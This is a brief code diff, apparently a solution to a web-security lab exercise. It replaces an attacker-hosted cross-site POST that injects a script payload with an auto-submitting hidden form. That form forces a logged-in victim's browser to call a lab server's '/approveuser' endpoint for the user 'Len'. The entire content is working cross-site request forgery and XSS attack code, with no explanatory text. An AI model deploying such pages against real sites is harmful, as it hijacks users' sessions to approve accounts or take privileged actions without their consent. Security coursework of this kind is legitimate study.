@@ -1,9 +1,14 @@
-<!-- hosted at https://attacker.com/xss.html -->
-<script>
-fetch("https://vulnerable-site.com/contact", {
-  method: "POST",
-  body: new URLSearchParams({ message: "<script>...</script>" }),
-  credentials: "include"
-});
-</script>
-
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Stand-alone POST to approve Len</title>
+</head>
+<body>
+  <form id="autoForm" action="https://xss01.websec.sec.in.tum.de/approveuser" method="POST">
+    <input type="hidden" name="username" value="Len">
+  </form>
+  <script>
+    document.getElementById('autoForm').submit();
+  </script>
+</body>
+</html>
